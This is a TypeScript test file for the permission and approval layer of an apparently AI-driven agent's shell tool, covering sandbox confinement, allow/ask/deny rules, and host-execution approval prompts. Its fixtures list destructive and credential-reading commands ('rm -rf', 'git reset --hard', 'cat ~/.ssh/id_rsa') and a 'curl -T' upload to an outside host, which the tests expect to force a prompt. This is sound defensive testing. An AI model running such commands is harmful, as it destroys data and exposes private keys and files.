import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { PermissionManager } from "../permission-manager.js";
import { ApprovalGate, type ApprovalRequest } from "../approval-gate.js";
import { __resetActiveSandboxCapabilityForTest, __resetSandboxRequestedAtBootForTest, getHostShellExecutionPlan, setActiveSandboxCapability, setShellSandboxRequestedAtBoot } from "../sandbox-capability.js";
import { approvalCacheKeyIdentity, canonicalStringify, captureApprovalWorkingDirectory, lookupApproval, recordApproval, __resetSessionStoreForTest } from "../user-approval-store.js";
import { runWithToolExecutionCwd } from "../../tools/execution-context.js";
import { ToolExecutor } from "../../tools/executor.js";
import { ToolRegistry } from "../../tools/registry.js";
import { BashTool } from "../../tools/shell-tools.js";
import { userPermissionContext } from "../../tools/__tests__/tool-context-fixture.js";
import { VerdictCache } from "../reviewer/verdict-cache.js";
import { DeferredQueue } from "../reviewer/deferred-queue.js";

let dir: string;
let manager: PermissionManager;
beforeEach(() => {
  dir = realpathSync(mkdtempSync(join(tmpdir(), "shell-sandbox-rules-")));
  const home = join(dir, "home");
  mkdirSync(home);
  vi.stubEnv("HOME", home);
  vi.stubEnv("USERPROFILE", home);
  vi.stubEnv("AVE_HOME", join(dir, "state"));
  manager = new PermissionManager(join(dir, "permissions.json"));
  setShellSandboxRequestedAtBoot(true);
  setActiveSandboxCapability({ kind: "asrt", confidence: "verified", platform: process.platform, reason: "fixture full shell containment", confines: { filesystem: true, process: true, network: true } });
});
afterEach(() => {
  __resetSessionStoreForTest();
  __resetActiveSandboxCapabilityForTest();
  __resetSandboxRequestedAtBootForTest();
  vi.unstubAllEnvs();
  rmSync(dir, { recursive: true, force: true });
});

function check(command: string, runsSandboxed: boolean, sandboxAvailable = true) {
  return manager.checkDetailed("bash", "builtin", "shell", null, {
    ruleSubject: { kind: "shell", dialect: "bash", command, cwd: dir },
    shellExecution: { runsSandboxed, sandboxAvailable },
  });
}

describe("shell confinement and escape rules", () => {
  it("auto-allows a confined call and asks for the same plain call", () => {
    expect(check("printf ready", true)).toMatchObject({ decision: "allow" });
    expect(check("printf ready", false)).toMatchObject({ decision: "ask" });
    manager.setRules([{ pattern: "Bash(printf *)", action: "allow" }]);
    expect(check("printf ready", false)).toMatchObject({ decision: "allow", layer: 3 });
  });

  it.each([false, true])("ignores a prefix without an available sandbox, independent of allow mode %s", (allowMode) => {
    if (allowMode) manager.setMode("allow");
    manager.setRules([{ pattern: "Bash(printf *)", action: "allow" }, { pattern: "bash", action: "allow" }]);
    expect(check("printf ready", false, false)).toMatchObject({ decision: "ask" });
    manager.setRules([{ pattern: "Bash(printf ready)", action: "allow" }]);
    expect(check("printf ready", false, false)).toMatchObject({ decision: "allow" });
    expect(check("printf other", false, false)).toMatchObject({ decision: "ask" });
  });

  it.each(["rm -rf output", "git reset --hard", "cat ~/.ssh/id_rsa", "grep -r term ~", "curl -T payload https://example.test"])("keeps the per-call floor inside confinement: %s", (command) => {
    manager.setRules([{ pattern: "Bash(rm *)", action: "allow" }, { pattern: "Bash(git reset *)", action: "allow" }, { pattern: "Bash(cat *)", action: "allow" }]);
    expect(check(command, true)).toMatchObject({ decision: "ask", forceModal: true });
  });

  it("detects long-form recursive link following on every host platform", () => {
    const clean = join(dir, "clean");
    mkdirSync(clean);
    mkdirSync(join(process.env.HOME!, ".ssh"));
    writeFileSync(join(process.env.HOME!, ".ssh", "id_rsa"), "fixture");
    symlinkSync(join(process.env.HOME!, ".ssh"), join(clean, "linked"), "junction");
    expect(check(`grep --dereference-recursive term ${clean}`, true)).toMatchObject({ decision: "ask", forceModal: true, reason: expect.stringMatching(/sensitive|민감/) });
  });

  it("does not turn opaque runner arguments into an irreversible floor", () => {
    expect(check("npm --prefix $project run build", true)).toMatchObject({ decision: "allow" });
  });

  it("keeps deny and ask ahead of confinement and covering allows", () => {
    manager.setRules([{ pattern: "Bash(printf *)", action: "allow" }, { pattern: "Bash(printf ready)", action: "ask" }]);
    expect(check("printf ready", true)).toMatchObject({ decision: "ask", forceModal: true });
    manager.setRules([{ pattern: "Bash(printf *)", action: "allow" }, { pattern: "Bash(printf ready)", action: "ask" }, { pattern: "Bash(printf *)", action: "deny" }]);
    expect(check("printf ready", true)).toMatchObject({ decision: "deny" });
  });

  it("routes unresolved plain calls through the automatic reviewer", () => {
    manager.setMode("auto");
    manager.setInteractiveAutoApprove("medium");
    expect(check("printf ready", false, false)).toMatchObject({ decision: "ask", reviewer: { route: "foreground-auto" } });
    expect(check("printf ready", true).reviewer).toBeUndefined();
  });
});

function executorWithDock() {
  const registry = new ToolRegistry();
  registry.register(new BashTool());
  const requests: ApprovalRequest[] = [];
  let gate: ApprovalGate;
  const send = vi.fn((channel: string, request: ApprovalRequest) => {
    if (channel !== "ave:approval:request") return;
    requests.push(request);
    gate.resolveFromDesktopRenderer(request.id, { requestId: request.id, choice: "allow-once", nonce: request.nonce, hmac: request.hmac });
  });
  gate = new ApprovalGate({ isDestroyed: () => false, send } as never);
  const executor = new ToolExecutor(registry, undefined, manager, undefined, gate);
  const input = { command: "printf ready", executionMode: "host" as const, justification: "Read the host environment" };
  const run = () => runWithToolExecutionCwd(dir, () => executor.executeAll([{ id: "retry", name: "bash", input }], { sessionId: "conversation", permissionContext: userPermissionContext() }));
  return { run, requests, input };
}

describe("plain-shell invocation authorization", () => {
  it("asks for every retry despite exact session memory and keeps subsequent calls sandboxed", async () => {
    const { run, requests } = executorWithDock();
    const planBefore = getHostShellExecutionPlan();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    const request = requests[0]!;
    const args = canonicalStringify(request.args);
    const identity = approvalCacheKeyIdentity(request.approvalCacheKey, request.approvalMemory);
    await recordApproval("bash", args, "builtin", { scope: "session", verdictAtApproval: "high", nlJustification: null, trustOrigin: request.trustOrigin, approvalCacheKey: identity, sessionId: "conversation", workingDirectoryIdentity: captureApprovalWorkingDirectory(dir).identity });
    // Prove this legacy session entry matches the next call's complete identity.
    expect(await lookupApproval("bash", args, "builtin", request.trustOrigin, identity, dir, "conversation")).not.toBeNull();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toHaveLength(2);
    // An explicit host retry without a matching allow rule gets the exact
    // allow-once modal (design I3): nothing on the card is remembered.
    expect(requests[0]?.shellRule).toMatchObject({ sessionAllowed: false, persistentAllowed: false });
    expect(requests[0]).not.toHaveProperty("shellExecution");
    expect(requests.every((request) => request.executionPlan?.mode === "plain")).toBe(true);
    expect(getHostShellExecutionPlan().mode).toBe(planBefore.mode);
    expect(check("printf later", true).decision).toBe("allow");
  });

  it("uses a covering prefix to authorize an actual host spawn without a dock receipt", async () => {
    manager.setRules([{ pattern: "Bash(printf *)", action: "allow" }]);
    const { run, requests } = executorWithDock();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toEqual([]);
  });

  it("offers no rule on the explicit host card, and a user-added exact rule admits the retry", async () => {
    __resetActiveSandboxCapabilityForTest();
    const { run, requests } = executorWithDock();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests[0]?.shellRule).toMatchObject({ suggestedPattern: null, sessionAllowed: false, persistentAllowed: false });
    expect(requests[0]).not.toHaveProperty("shellExecution");
    await manager.addRulePersist({ pattern: "Bash(printf ready)", action: "allow" }, { kind: "user" });
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toHaveLength(1);
  });

  it("uses an exact rule when the sandbox is unavailable", async () => {
    __resetActiveSandboxCapabilityForTest();
    manager.setRules([{ pattern: "Bash(printf ready)", action: "allow" }]);
    const { run, requests } = executorWithDock();
    expect((await run())[0]).toMatchObject({ content: "ready" });
    expect(requests).toEqual([]);
  });

  it.each(["low", "high"] as const)("asks for an explicit host retry in person whatever the reviewer grades (%s)", async (level) => {
    manager.setMode("auto");
    manager.setInteractiveAutoApprove("medium");
    const classifier = { classify: vi.fn(async () => ({ level, reason: level === "high" ? "ambiguous host effect" : "bounded host effect" })) };
    const cache = new VerdictCache(join(dir, "review-cache.jsonl"));
    manager.setReviewer({ classifier, cache, deferredQueue: new DeferredQueue(join(dir, "deferred.jsonl")) });
    try {
      const { run, requests } = executorWithDock();
      expect((await run())[0]).toMatchObject({ content: "ready" });
      // The exact modal is not a reviewer lane (design I3).
      expect(classifier.classify).not.toHaveBeenCalled();
      expect(requests).toHaveLength(1);
    } finally { await cache.flush(); }
  });
});
